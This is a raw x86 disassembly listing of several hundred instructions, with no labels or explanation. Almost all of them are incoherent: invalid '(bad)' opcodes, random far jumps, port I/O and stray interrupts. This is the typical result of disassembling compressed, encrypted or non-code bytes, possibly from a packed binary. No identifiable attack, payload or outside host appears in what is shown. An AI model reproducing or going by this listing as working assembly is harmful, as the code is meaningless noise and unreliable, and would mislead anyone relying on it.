  402ff7:	mov    ecx,0xaf9eca0a
  402ffc:	pusha  
  402ffd:	pop    esi
  402ffe:	jp     0x402fb3
  403000:	pusha  
  403001:	jmp    0xf7ee:0x76c49635
  403008:	mov    ah,0x20
  40300a:	arpl   WORD PTR [eax-0x69],dx
  40300d:	test   al,0x76
  40300f:	je     0x403021
  403011:	stos   BYTE PTR es:[edi],al
  403012:	mov    bl,0xc2
  403014:	add    BYTE PTR [ebp+0x59619807],dl
  40301a:	in     al,0xd3
  40301c:	je     0x403034
  40301e:	jb     0x403087
  403020:	jo     0x40303d
  403022:	int    0x94
  403024:	stos   DWORD PTR es:[edi],eax
  403025:	sub    cl,bh
  403027:	shl    ch,cl
  403029:	ins    DWORD PTR es:[edi],dx
  40302a:	loopne 0x403049
  40302c:	or     al,0xfd
  40302e:	popa   
  40302f:	js     0x403098
  403031:	test   eax,0xf9c2a064
  403036:	inc    eax
  403037:	xchg   esp,ecx
  403039:	mov    al,0xb
  40303b:	(bad)  
  40303c:	es lock aas 
  40303f:	xlat   BYTE PTR ds:[ebx]
  403040:	inc    ebx
  403041:	stc    
  403042:	je     0x40306a
  403044:	push   es
  403045:	mov    al,ds:0xfe2c8ee8
  40304a:	fimul  WORD PTR [eax]
  40304c:	enter  0x3b8f,0x35
  403050:	int    0xa5
  403052:	repz add DWORD PTR [ebx],ebp
  403055:	inc    ebx
  403056:	mov    cl,0x69
  403058:	pop    eax
  403059:	push   es
  40305a:	add    eax,DWORD PTR [ebx]
  40305c:	xchg   DWORD PTR [ebp-0x7499dc13],ebp
  403062:	inc    ebp
  403063:	cld    
  403064:	jmp    0x403415
  403069:	jl     0x403082
  40306b:	sub    al,0xf7
  40306d:	jge    0x402ffc
  40306f:	jge    0x40306e
  403071:	inc    edx
  403072:	sbb    dh,BYTE PTR [ebx]
  403074:	fild   DWORD PTR [esi-0x35]
  403077:	and    esp,esi
  403079:	sahf   
  40307a:	sbb    bh,BYTE PTR [esi+0x7e]
  40307d:	xor    BYTE PTR [ecx+0x7e],0x7e
  403081:	add    al,0x8c
  403083:	pop    edx
  403084:	pop    esi
  403085:	mov    ch,0x41
  403087:	dec    esi
  403088:	into   
  403089:	(bad)  
  40308a:	add    BYTE PTR [edi-0x45],dh
  40308d:	std    
  40308e:	mov    bl,0x7c
  403090:	sub    eax,0x435901c
  403095:	mov    ebp,0x955599d7
  40309a:	pop    ebp
  40309b:	fisub  DWORD PTR [ecx]
  40309d:	mov    eax,ds:0x8ddd60af
  4030a2:	pop    ebp
  4030a3:	repz loope 0x40303d
  4030a6:	mov    WORD PTR [ecx+edx*4+0x2dcc7dd3],?
  4030ad:	(bad)  
  4030ae:	gs pop edx
  4030b0:	jbe    0x4030d5
  4030b2:	das    
  4030b3:	and    BYTE PTR [edx],ah
  4030b5:	popa   
  4030b6:	loopne 0x4030e4
  4030b8:	inc    edi
  4030b9:	push   ss
  4030ba:	push   esi
  4030bb:	xor    edx,DWORD PTR [esi]
  4030bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030be:	mov    dh,0xbf
  4030c0:	lds    edi,FWORD PTR [ebx-0x18]
  4030c3:	add    DWORD PTR [edi],esi
  4030c5:	ret    
  4030c6:	loopne 0x403099
  4030c8:	bnd ja 0x4030e6
  4030cb:	mov    al,ds:0x7d3b9385
  4030d0:	adc    DWORD PTR [edi+esi*1-0x5807222],esi
  4030d7:	mov    ah,0x8c
  4030d9:	jmp    0x8aff:0x822cc3db
  4030e0:	mov    eax,ds:0x1e383dc6
  4030e5:	cmp    BYTE PTR [edx],0xda
  4030e8:	xchg   ecx,eax
  4030e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030ea:	loope  0x40306d
  4030ec:	fwait
  4030ed:	jno    0x4030f2
  4030ef:	mov    DWORD PTR [ebp+0x74],ecx
  4030f2:	js     0x403158
  4030f4:	popa   
  4030f5:	nop
  4030f6:	xor    bh,BYTE PTR [edi+0xc94a5f0]
  4030fc:	xlat   BYTE PTR ds:[ebx]
  4030fd:	push   ss
  4030fe:	sub    eax,0xdbf464fb
  403103:	inc    esi
  403104:	das    
  403105:	add    dl,ch
  403107:	push   0x5c854664
  40310c:	push   edi
  40310d:	xchg   edx,eax
  40310e:	add    DWORD PTR [esi-0x75078dc9],esi
  403114:	pop    esi
  403115:	inc    edi
  403116:	xchg   DWORD PTR [esi+0x73fa749c],ecx
  40311c:	inc    ecx
  40311d:	and    edx,DWORD PTR [ebx+0x62]
  403120:	sti    
  403121:	test   al,0x83
  403123:	add    DWORD PTR ds:0x930e8657,eax
  403129:	clc    
  40312a:	add    DWORD PTR [edi-0x2b],esi
  40312d:	mov    eax,0xfcef8e7a
  403132:	div    BYTE PTR es:[ecx+0x393d53f2]
  403139:	inc    ecx
  40313a:	cmp    BYTE PTR [edi-0x5b4e0de8],0x72
  403141:	fs mov ebx,0xbd08e98a
  403147:	into   
  403148:	mov    bl,0xa1
  40314a:	ss ds int3 
  40314d:	xchg   esi,eax
  40314e:	sbb    ebp,esi
  403150:	mov    edx,0xb2878185
  403155:	pop    es
  403156:	inc    eax
  403157:	punpckhbw mm4,mm0
  40315a:	stos   BYTE PTR es:[edi],al
  40315b:	aam    0xb5
  40315d:	js     0x403141
  40315f:	add    cl,BYTE PTR [esi+ebx*2]
  403162:	mov    ss,WORD PTR [ebp+0x6f]
  403165:	(bad)  
  403166:	repnz (bad)
  40316a:	adc    eax,0xa33dff01
  40316f:	dec    esi
  403170:	cdq    
  403171:	repz dec esi
  403173:	push   ebp
  403174:	aad    0xca
  403176:	int3   
  403177:	(bad)  
  403178:	xchg   edx,eax
  403179:	loope  0x403106
  40317b:	adc    edx,esi
  40317d:	push   ss
  40317e:	rcr    DWORD PTR [edx+0x7e],cl
  403181:	pop    ds
  403182:	adc    BYTE PTR [eax+0x0],bh
  403185:	pop    edi
  403186:	jns    0x40311f
  403188:	ss push edi
  40318a:	pop    es
  40318b:	jno    0x4031cc
  40318d:	dec    esi
  40318e:	(bad)  
  40318f:	xor    ebx,DWORD PTR [ebp-0x22]
  403192:	cmp    DWORD PTR [eax],eax
  403194:	sahf   
  403195:	or     ebx,DWORD PTR [ecx-0x71716266]
  40319b:	mov    ecx,0x165497ef
  4031a0:	test   eax,0x79a13dd6
  4031a5:	or     DWORD PTR [ecx+ebp*2-0x28c161f9],edx
  4031ac:	mov    bh,0x6c
  4031ae:	retf   0xf4f8
  4031b1:	(bad)  
  4031b2:	mov    cl,0xb7
  4031b4:	nop
  4031b5:	mov    bl,0x4d
  4031b7:	bnd jl 0x403193
  4031ba:	and    eax,0xbb7d93fa
  4031bf:	sbb    DWORD PTR [eax-0x2d],0x7c
  4031c3:	pop    edi
  4031c4:	mov    esp,0x19b2aa64
  4031c9:	nop
  4031ca:	scas   al,BYTE PTR es:[edi]
  4031cb:	ret    0x4d28
  4031ce:	or     ch,cl
  4031d0:	pop    es
  4031d1:	jmp    0x4031dc
  4031d3:	push   edx
  4031d4:	es ds pop ds
  4031d7:	mov    esi,0x6618282
  4031dc:	or     esp,DWORD PTR [edx-0x62588464]
  4031e2:	sub    esp,DWORD PTR [edx]
  4031e4:	cmp    ecx,DWORD PTR [edx-0x41]
  4031e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031e8:	std    
  4031e9:	fist   DWORD PTR [esi]
  4031eb:	aas    
  4031ec:	sbb    DWORD PTR [ebx],eax
  4031ee:	mov    ah,0x75
  4031f0:	inc    ebp
  4031f1:	push   ebx
  4031f2:	add    al,BYTE PTR [esi+0xb]
  4031f5:	adc    al,0x30
  4031f7:	push   esp
  4031f8:	cld    
  4031f9:	xchg   ecx,eax
  4031fa:	sbb    DWORD PTR [ebp-0x44],edx
  4031fd:	and    al,0xb
  4031ff:	(bad)  
  403200:	jecxz  0x403213
  403202:	mov    ecx,DWORD PTR cs:[ebx-0x7f]
  403206:	xchg   edx,eax
  403207:	dec    eax
  403208:	jmp    0x4031b3
  40320a:	mov    eax,ds:0xfbafed9
  40320f:	and    ebp,ebx
  403211:	lods   eax,DWORD PTR ds:[esi]
  403212:	pushf  
  403213:	sbb    BYTE PTR [bp+si-0xa],0xd5
  403218:	pop    eax
  403219:	push   cs
  40321a:	fs stos BYTE PTR es:[edi],al
  40321c:	inc    esi
  40321d:	shl    BYTE PTR [ecx+edi*4],1
  403220:	aas    
  403221:	jl     0x40325d
  403223:	repz xchg edx,eax
  403225:	enter  0x592c,0xeb
  403229:	pop    ds
  40322a:	lods   al,BYTE PTR ds:[esi]
  40322b:	js     0x4031d4
  40322d:	push   es
  40322e:	adc    dh,BYTE PTR ds:0x26d56384
  403234:	sbb    BYTE PTR [eax+0x0],0x27
  403238:	jmp    0x3b27:0xf1df6e66
  40323f:	pop    esp
  403240:	mov    al,0x1c
  403242:	fadd   DWORD PTR [ebx]
  403244:	pop    ebp
  403245:	gs mov esi,0x9596c13b
  40324b:	mov    bl,0x10
  40324d:	pop    es
  40324e:	fisttp WORD PTR [edi+0x3fb4a68]
  403254:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403255:	xchg   BYTE PTR [ebx-0x6b5180d8],dl
  40325b:	mov    ebx,0x874fa8fb
  403260:	leave  
  403261:	cmp    BYTE PTR [ebx+0x2f],dl
  403264:	push   ebp
  403265:	js     0x40325c
  403267:	std    
  403268:	out    dx,eax
  403269:	sub    BYTE PTR [edx+esi*2+0x74],ch
  40326d:	pshufw mm6,QWORD PTR [esi+0xf],0x89
  403272:	ror    DWORD PTR [ecx-0x47],0x73
  403276:	mov    es,WORD PTR [eax]
  403278:	or     ah,BYTE PTR [edi]
  40327a:	in     al,dx
  40327b:	or     al,0xc
  40327d:	cmp    al,0xc9
  40327f:	int3   
  403280:	cmc    
  403281:	mov    edx,0xa6859a93
  403286:	or     ah,BYTE PTR [ecx]
  403288:	mov    cs,WORD PTR [ebx-0xec1af72]
  40328e:	cs dec ebx
  403290:	in     al,dx
  403291:	adc    ch,BYTE PTR [ecx]
  403293:	jns    0x40329c
  403295:	outs   dx,DWORD PTR ds:[esi]
  403296:	es jbe 0x4032ab
  403299:	or     dh,BYTE PTR [edi+0x5c074e37]
  40329f:	(bad)  
  4032a1:	xor    DWORD PTR [ebx+0x31e92a57],esp
  4032a7:	(bad)  [esi-0x7]
  4032aa:	adc    BYTE PTR [esi+0x49],dh
  4032ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032ae:	sar    BYTE PTR [edi+0x46],1
  4032b1:	mov    al,ds:0x5a904d5d
  4032b6:	mov    BYTE PTR [esp+edi*2+0xc],bh
  4032ba:	push   ebx
  4032bb:	loope  0x403247
  4032bd:	out    0x3f,eax
  4032bf:	sub    BYTE PTR [edi],bl
  4032c1:	push   0xbacc43ca
  4032c6:	and    ecx,DWORD PTR [edx]
  4032c8:	mov    cl,0xb3
  4032ca:	(bad)  [eax+0x22]
  4032cd:	(bad)
  4032d0:	lock cmc 
  4032d2:	adc    al,0xeb
  4032d4:	inc    esp
  4032d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4032d6:	gs dec edi
  4032d8:	add    eax,0xd3932d
  4032dd:	ins    DWORD PTR es:[edi],dx
  4032de:	and    eax,0x5028af98
  4032e3:	loop   0x4032b5
  4032e5:	or     al,0xf4
  4032e7:	sub    ecx,DWORD PTR [edi+0x62fdf497]
  4032ed:	and    edx,edx
  4032ef:	sub    BYTE PTR [edi+0x8],0xa2
  4032f3:	jle    0x4032f4
  4032f5:	loop   0x403317
  4032f7:	add    ecx,eax
  4032f9:	aas    
  4032fa:	sbb    cl,BYTE PTR [ebx+0x1bec529d]
  403300:	stos   BYTE PTR es:[edi],al
  403301:	push   cs
  403302:	and    eax,0xe8752de1
  403307:	hlt    
  403308:	leave  
  403309:	adc    DWORD PTR [ebp-0x2b],ebx
  40330c:	call   0xbeb98cc1
  403311:	mov    WORD PTR [edx],gs
  403313:	stc    
  403314:	adc    eax,0xc4319315
  403319:	jbe    0x40336c
  40331b:	mov    bl,0x76
  40331d:	or     ecx,esp
  40331f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403320:	and    bl,0x7c
  403323:	int3   
  403324:	iret   
  403325:	jecxz  0x4032bc
  403327:	ins    DWORD PTR es:[edi],dx
  403328:	mov    edi,0x6e3c92e5
  40332d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40332e:	mov    BYTE PTR ds:0x35b33ae8,ah
  403334:	mov    ah,ah
  403336:	jae    0x403320
  403338:	xchg   esi,eax
  403339:	and    ecx,edi
  40333b:	scas   al,BYTE PTR es:[edi]
  40333c:	mov    dl,0x36
  40333e:	xchg   edi,eax
  40333f:	push   ds
  403340:	cmp    eax,DWORD PTR [ecx-0x4a]
  403343:	cdq    
  403344:	jge    0x40337c
  403346:	inc    ebp
  403347:	jmp    0x403384
  403349:	lahf   
  40334a:	mov    ch,0x1
  40334c:	in     al,dx
  40334d:	ror    DWORD PTR [edi+0x62],1
  403350:	lea    ebx,[ecx-0x1f]
  403353:	xchg   esi,eax
  403354:	loope  0x403387
  403356:	jge    0x4033a0
  403358:	cli    
  403359:	ja     0x4033c2
  40335b:	cmp    dh,bl
  40335d:	xor    eax,0xdf42d196
  403362:	sub    BYTE PTR [esi+eax*1],0xdd
  403366:	mul    BYTE PTR [ebx+0x6ac748d5]
  40336c:	mov    ebp,0x22065e2f
  403371:	sbb    esi,esi
  403373:	pop    ebp
  403374:	jl     0x40337a
  403376:	test   BYTE PTR [edi-0x28],al
  403379:	xor    DWORD PTR [esi],edi
  40337b:	mov    ds:0x40d87694,eax
  403380:	mov    ebx,0x8125d15c
  403385:	imul   esi,DWORD PTR [edi-0x4b],0xffffffc7
  403389:	push   esp
  40338a:	and    al,0x59
  40338c:	jne    0x4033fd
  40338e:	jl     0x4033b0
  403390:	cli    
  403391:	rcr    BYTE PTR [edx+0x302b1d74],0x36
  403398:	div    DWORD PTR [edi]
  40339a:	ror    esp,1
  40339c:	xchg   edx,eax
  40339d:	ret    
  40339e:	add    DWORD PTR ds:0xc82f72b5,eax
  4033a4:	inc    esi
  4033a5:	inc    edi
  4033a6:	push   ebx
  4033a7:	or     bh,cl
  4033a9:	push   ds
  4033aa:	jb     0x4033c4
  4033ac:	sub    DWORD PTR [ecx],esi
  4033ae:	call   0xf724242b
  4033b3:	dec    edi
  4033b4:	cmc    
  4033b5:	xor    esp,DWORD PTR [eax+0x6bdac486]
  4033bb:	ret    
  4033bc:	std    
  4033bd:	pop    ss
  4033be:	mov    ah,0xe5
  4033c0:	mov    bl,0x67
  4033c2:	cmp    al,0xb
  4033c4:	mov    DWORD PTR [esi],eax
  4033c6:	sub    eax,0x8056c798
  4033cb:	das    
  4033cc:	pop    ebp
  4033cd:	ins    DWORD PTR es:[edi],dx
  4033ce:	(bad)  
  4033cf:	mov    al,0xc
  4033d1:	jge    0x403438
  4033d3:	adc    ecx,ecx
  4033d5:	cmc    
  4033d6:	sbb    esp,DWORD PTR [eax+0x6d2736b2]
  4033dc:	lahf   
  4033dd:	or     BYTE PTR [eax],bl
  4033df:	xchg   DWORD PTR [esi],ebx
  4033e1:	push   0xffffff93
  4033e3:	dec    esi
  4033e4:	call   0xc9579b5
  4033e9:	and    BYTE PTR [ebx+0x66818cb0],ch
  4033ef:	push   ebp
  4033f0:	sub    ch,BYTE PTR [edx-0x37d56565]
  4033f6:	test   al,0x52
  4033f8:	test   eax,0xc2de623a
  4033fd:	add    dl,BYTE PTR [eax]
  4033ff:	clc    
  403400:	xchg   BYTE PTR [eax],cl
  403402:	ficomp DWORD PTR [edi+edi*1-0x52]
  403406:	or     eax,0xb2a761cc
  40340b:	fld    TBYTE PTR [edi-0x579be5e1]
  403411:	je     0x4033b3
  403413:	add    esi,ebp
  403415:	mov    edi,DWORD PTR [ebp+0x8]
  403418:	mov    edi,DWORD PTR [edi]
  40341a:	mov    edx,0x8a40
  40341f:	xor    ax,dx
  403422:	jmp    0x4037d3
  403427:	nop
  403428:	cdq    
  403429:	fst    QWORD PTR [ecx-0x6683aa03]
  40342f:	xlat   BYTE PTR ds:[ebx]
  403430:	push   cs
  403431:	mov    cl,0xfe
  403433:	dec    esi
  403434:	xchg   ecx,eax
  403435:	jmp    0x40347f
  403437:	and    bl,BYTE PTR [esi]
  403439:	jle    0x4034b9
  40343b:	xor    BYTE PTR [ecx+0x7e],0x7e
  40343f:	aad    0x9
  403441:	jb     0x4033f6
  403443:	xor    eax,0x7ae88ed6
  403448:	retf   0x7e24
  40344b:	jg     0x40344b
  40344d:	xchg   ah,bl
  40344f:	test   al,0xd7
  403451:	mov    DWORD PTR [ecx+0x76045a0f],eax
  403457:	xor    eax,0x99729774
  40345c:	out    0xda,al
  40345e:	add    al,0x9f
  403460:	mov    ds:0xebdf52d9,eax
  403465:	mov    ebp,0x94c224e4
  40346a:	les    esi,FWORD PTR [eax]
  40346c:	in     al,dx
  40346d:	mov    ah,0x7
  40346f:	mov    eax,ds:0xcc6f7a24
  403474:	fcomp  DWORD PTR [ebx-0x37746477]
  40347a:	(bad)  [ecx-0x64018264]
  403480:	jge    0x4034c6
  403482:	shl    BYTE PTR [edi-0x2e],0x59
  403486:	inc    edi
  403487:	sbb    eax,0xae87a191
  40348c:	scas   al,BYTE PTR es:[edi]
  40348d:	and    BYTE PTR [edi-0x21],0xcd
  403491:	add    dh,BYTE PTR [eax-0x202b98db]
  403497:	jl     0x40345d
  403499:	push   esp
  40349a:	mov    cl,0x77
  40349c:	and    DWORD PTR [edx+0x5b],edi
  40349f:	dec    esp
  4034a0:	outs   dx,DWORD PTR ds:[esi]
  4034a1:	test   DWORD PTR [esi+0x44f7bf7],ecx
  4034a7:	xchg   ebx,eax
  4034a8:	sub    BYTE PTR [ebx],ch
  4034aa:	or     eax,0xd412067c
  4034af:	cmp    al,0x3a
  4034b1:	inc    esi
  4034b2:	xor    ch,ch
  4034b4:	fnsave [ebp+0x47]
  4034b7:	(bad)  
  4034b8:	ds sub al,0x72
  4034bb:	fst    DWORD PTR [esi]
  4034bd:	jg     0x403531
  4034bf:	push   ebx
  4034c0:	xor    dh,cl
  4034c2:	or     ebp,DWORD PTR [edx-0x771ef5ae]
  4034c8:	ins    DWORD PTR es:[edi],dx
  4034c9:	mov    dh,0xfd
  4034cb:	int    0x8f
  4034cd:	pop    ebx
  4034ce:	and    ah,BYTE PTR [eax-0x1969ef0]
  4034d4:	push   0x21d6a04c
  4034d9:	cmp    BYTE PTR [esi+edi*2-0x2e],0x92
  4034de:	ins    DWORD PTR es:[edi],dx
  4034df:	sub    BYTE PTR [ecx+esi*2-0x1a9ba85d],0x2f
  4034e7:	pop    ds
  4034e8:	out    0x76,eax
  4034ea:	daa    
  4034eb:	mov    edx,0x8f048840
  4034f0:	out    dx,al
  4034f1:	sti    
  4034f2:	xchg   ebx,eax
  4034f3:	sbb    eax,0xbe21341a
  4034f8:	push   ds
  4034f9:	iret   
  4034fa:	imul   esi,DWORD PTR [esi-0x37e7e07b],0xc65888c3
  403504:	push   esp
  403505:	stos   DWORD PTR es:[edi],eax
  403506:	sbb    bl,al
  403508:	inc    edx
  403509:	loope  0x4034c5
  40350b:	cmc    
  40350c:	inc    ecx
  40350d:	cld    
  40350e:	xchg   ebx,eax
  40350f:	dec    ebx
  403510:	bound  edx,QWORD PTR [edx+0x50260722]
  403516:	xchg   DWORD PTR [esi+0x49f55419],edx
  40351c:	dec    esi
  40351d:	xchg   edx,eax
  40351e:	pop    ds
  40351f:	sub    al,dh
  403521:	inc    edx
  403522:	cld    
  403523:	adc    DWORD PTR [ebx],esp
  403525:	(bad)  
  403526:	stc    
  403527:	jmp    0x4034cb
  403529:	dec    ecx
  40352a:	std    
  40352b:	aaa    
  40352c:	shl    DWORD PTR [esi-0x27bf1bbe],1
  403532:	rcr    BYTE PTR [ecx-0x41ce2e2f],1
  403538:	xchg   edx,eax
  403539:	dec    ecx
  40353a:	ret    0xc928
  40353d:	and    BYTE PTR [eax+0x599a3203],bh
  403543:	(bad)  
  403546:	sbb    DWORD PTR [esi],edi
  403548:	xchg   ebp,eax
  403549:	adc    al,0x4d
  40354b:	ins    BYTE PTR es:[edi],dx
  40354c:	imul   esp,DWORD PTR [edx],0xc6e5da88
  403552:	adc    DWORD PTR [edx],0x73a3df0b
  403558:	and    BYTE PTR [ebx-0x1e17e52],bl
  40355e:	push   bp
  403560:	push   0xe49ff525
  403565:	jno    0x4034fb
  403567:	xchg   ecx,eax
  403568:	test   esi,esp
  40356a:	es js  0x4035a8
  40356d:	adc    DWORD PTR [ebp-0x7579ce9e],esi
  403573:	pop    edx
  403574:	pop    edx
  403575:	hlt    
  403576:	mov    ds:0xc29ed9c,eax
  40357b:	rol    BYTE PTR [edi],1
  40357d:	pop    ebx
  40357e:	iret   
  40357f:	pusha  
  403580:	sbb    DWORD PTR [edi],edi
  403582:	inc    esp
  403583:	rcr    BYTE PTR [esi-0x44],1
  403586:	mov    cs,esi
  403588:	xchg   esi,eax
  403589:	add    eax,0xc1db42ca
  40358e:	(bad)  
  40358f:	push   edx
  403590:	fmul   st,st(0)
  403592:	repz mov al,BYTE PTR [ecx]
  403595:	dec    ebp
  403596:	cmp    DWORD PTR [esi+edx*4+0x4c],0xdc745be1
  40359e:	shl    BYTE PTR [edx+0x639f799a],cl
  4035a4:	adc    DWORD PTR [edi-0x36817df1],ecx
  4035aa:	adc    esp,ecx
  4035ac:	push   cs
  4035ad:	imul   esp,esp,0x70
  4035b0:	xor    bh,bh
  4035b2:	or     DWORD PTR [esi],eax
  4035b4:	inc    ebp
  4035b5:	inc    edi
  4035b6:	and    BYTE PTR [ebp+eiz*8-0x6c],al
  4035ba:	sbb    cl,cl
  4035bc:	clc    
  4035bd:	int3   
  4035be:	out    0xf5,eax
  4035c0:	outs   dx,BYTE PTR ds:[esi]
  4035c1:	dec    BYTE PTR [esi+eax*2+0x5d81dde0]
  4035c8:	jb     0x403620
  4035ca:	or     DWORD PTR [ebx-0x7f],esi
  4035cd:	je     0x4035ff
  4035cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035d0:	adc    DWORD PTR [esi+0x1],0x6a
  4035d4:	dec    esi
  4035d5:	cmp    ebp,DWORD PTR [edx+ebp*2+0x1d]
  4035d9:	pop    eax
  4035da:	push   DWORD PTR [edi-0x3482dcd3]
  4035e0:	cmc    
  4035e1:	retf   
  4035e2:	call   0x28b37a16
  4035e7:	push   eax
  4035e8:	push   0x6e5dfa26
  4035ed:	stc    
  4035ee:	inc    ecx
  4035ef:	bound  edi,QWORD PTR [eax+ebx*8-0x25]
  4035f3:	adc    al,0xf7
  4035f5:	es push ds
  4035f7:	in     eax,0xa
  4035f9:	add    DWORD PTR [esi-0x3648bad8],ebx
  4035ff:	shr    DWORD PTR ds:[eax+0x5c],0x9e
  403604:	popa   
  403605:	(bad)  
  403606:	dec    BYTE PTR [esi]
  403608:	sbb    BYTE PTR ds:0x3a9708c7,ah
  40360e:	jb     0x40364e
  403610:	add    bh,BYTE PTR [ecx-0x25c42033]
  403616:	mov    ebx,0x5afa5ee3
  40361b:	jmp    0x403609
  40361d:	xchg   ecx,eax
  40361e:	mov    ds:0xe663d586,al
  403623:	js     0x4035f0
  403625:	jmp    0x469f:0x2a9ffc50
  40362c:	pop    ebp
  40362d:	test   al,0x39
  40362f:	pop    ebp
  403630:	mov    dh,0x1f
  403632:	dec    ebx
  403633:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403634:	outs   dx,BYTE PTR ds:[esi]
  403635:	cwde   
  403636:	add    DWORD PTR [ebx],ebx
  403638:	xchg   edx,eax
  403639:	jmp    0x5737:0xe1cc24e9
  403640:	(bad)  
  403641:	into   
  403642:	ret    0x6c47
  403645:	jnp    0x403637
  403647:	outs   dx,BYTE PTR ds:[esi]
  403648:	test   eax,0xc95472a3
  40364d:	mov    bh,0x17
  40364f:	pop    esi
  403650:	dec    ecx
  403651:	and    ecx,esp
  403653:	push   ds
  403654:	push   0xffffffd8
  403656:	push   eax
  403657:	shl    DWORD PTR [esp+edi*4-0x4b],cl
  40365b:	jo     0x40369e
  40365d:	jg     0x403610
  40365f:	out    0x19,eax
  403661:	std    
  403662:	add    BYTE PTR [ebp-0x2d8ad1b8],0xc
  403669:	lahf   
  40366a:	cmovo  ebx,DWORD PTR [edx+0x3d]
  40366e:	mov    esp,0xd0e5fd0d
  403673:	ins    DWORD PTR es:[edi],dx
  403674:	in     eax,0x12
  403676:	in     eax,0xe3
  403678:	ins    DWORD PTR es:[edi],dx
  403679:	xchg   edi,eax
  40367a:	aad    0xa1
  40367c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40367d:	arpl   bp,sp
  40367f:	fisttp DWORD PTR [ecx+eiz*4]
  403682:	loopne 0x4036b3
  403684:	and    BYTE PTR [edi+0x7e1095f3],ah
  40368a:	mov    ecx,0x749a4787
  40368f:	mov    ds:0xfdf94a87,al
  403694:	add    BYTE PTR [edx+ebp*2],cl
  403697:	fldcw  WORD PTR [eax-0x28]
  40369a:	out    0x32,al
  40369c:	adc    al,0x3d
  40369e:	pop    edx
  40369f:	xor    dl,BYTE PTR [edi]
  4036a1:	or     eax,0x39d269b
  4036a6:	outs   dx,BYTE PTR ds:[esi]
  4036a7:	dec    esi
  4036a8:	sbb    eax,0xddfb7f60
  4036ad:	es std 
  4036af:	push   esp
  4036b0:	pushf  
  4036b1:	and    cl,BYTE PTR ds:0x85880a7a
  4036b7:	jo     0x403657
  4036b9:	adc    cl,0x0
  4036bc:	xor    DWORD PTR [ebp+0x25a55b39],ebp
  4036c2:	into   
  4036c3:	jp     0x40369e
  4036c5:	lds    eax,FWORD PTR [edi-0x411bcf]
  4036cb:	retf   
  4036cc:	stc    
  4036cd:	pop    esp
  4036ce:	retf   
  4036cf:	repz shl esp,0x1f
  4036d3:	sti    
  4036d4:	sbb    DWORD PTR [ebp+0x626fc430],0x38c6bd76
  4036de:	fimul  DWORD PTR [ebx-0x3510e22]
  4036e4:	jno    0x4036c2
  4036e6:	adc    al,BYTE PTR [edx]
  4036e8:	cwde   
  4036e9:	lds    edi,FWORD PTR [eax-0x5e]
  4036ec:	mov    ecx,0x9ee5cf4b
  4036f1:	sub    ebp,DWORD PTR [ecx-0x1cd2c540]
  4036f7:	xchg   ebx,eax
  4036f8:	sbb    BYTE PTR [ecx-0x781e192a],0x81
  4036ff:	in     eax,0x70
  403701:	adc    al,0x56
  403703:	and    bl,dl
  403705:	xchg   esp,eax
  403706:	test   dl,dl
  403708:	push   ds
  403709:	ret    
  40370a:	loop   0x403717
  40370c:	out    0x10,al
  40370e:	or     cl,BYTE PTR [si]
  403711:	js     0x403771
  403713:	fnstcw WORD PTR [edx+0x4a]
  403716:	lea    esi,[ecx]
  403718:	icebp  
  403719:	sti    
  40371a:	inc    edx
  40371b:	dec    ebx
  40371c:	popa   
  40371d:	jae    0x403730
  40371f:	xchg   ebx,eax
  403720:	pop    es
  403721:	out    dx,eax
  403722:	mov    dl,0x30
  403724:	jg     0x40379c
  403726:	xchg   esi,eax
  403727:	shl    dh,cl
  403729:	jbe    0x403771
  40372b:	xor    ebx,DWORD PTR [ebp-0x25]
  40372e:	(bad)  
  40372f:	fisubr WORD PTR [edi-0x6b]
  403732:	inc    esi
  403733:	add    al,0xf4
  403735:	pop    esi
  403736:	int3   
  403737:	or     al,0xc1
  403739:	mov    ds:0xd46f612e,eax
  40373e:	mov    bl,bh
  403740:	jle    0x403768
  403742:	adc    DWORD PTR [edx],esp
  403744:	sahf   
  403745:	cmp    BYTE PTR [esi+0x48],cl
  403748:	cli    
  403749:	jno    0x40376c
  40374b:	xor    dh,BYTE PTR [eax+esi*2]
  40374e:	xchg   ebp,eax
  40374f:	inc    esi
  403750:	dec    edx
  403751:	mov    dh,0x3a
  403753:	xchg   edx,eax
  403754:	das    
  403755:	mov    WORD PTR [ecx+0x3f918946],?
  40375b:	cmp    dh,BYTE PTR [ecx+0x6ed865e7]
  403761:	(bad)  
  403762:	in     al,0x36
  403764:	push   esp
  403765:	mov    dh,0x91
  403767:	jb     0x40370d
  403769:	out    0x7c,eax
  40376b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40376c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40376d:	push   esi
  40376e:	push   cs
  40376f:	in     al,0x86
  403771:	out    dx,eax
  403772:	les    edi,FWORD PTR [ecx-0x30da1ee2]
  403778:	pop    eax
  403779:	lea    edi,[edi+0x4a]
  40377c:	cld    
  40377d:	mov    dh,0x9f
  40377f:	mov    eax,ds:0x41303d82
  403784:	aaa    
  403785:	xor    DWORD PTR [eax],esp
  403787:	out    dx,eax
  403788:	popa   
  403789:	addr16 into 
  40378b:	lods   al,BYTE PTR ds:[esi]
  40378c:	xor    eax,0x44cc1337
  403791:	enter  0xd8da,0x6d
  403795:	inc    ebp
  403796:	imul   ecx,DWORD PTR [esi],0x26bea805
  40379c:	mov    esp,0x68758b05
  4037a1:	push   esi
  4037a2:	xor    dh,0x3a
  4037a5:	xchg   BYTE PTR [edi+edx*1],cl
  4037a8:	push   0x3f7514a
  4037ad:	push   ds
  4037ae:	out    0xa8,eax
  4037b0:	inc    ebx
  4037b1:	mov    BYTE PTR [ebp+0x5ce258aa],ah
  4037b7:	xchg   esi,eax
  4037b8:	mov    ss,esi
  4037ba:	add    DWORD PTR [ecx+0x39],edi
  4037bd:	and    cl,BYTE PTR [ecx+0x3e]
  4037c0:	fbld   TBYTE PTR [ebx-0x7e21be9f]
  4037c6:	cmp    ecx,DWORD PTR ds:[ebx+0x211e3b6c]
  4037cd:	in     eax,0x4c
  4037cf:	xchg   edx,eax
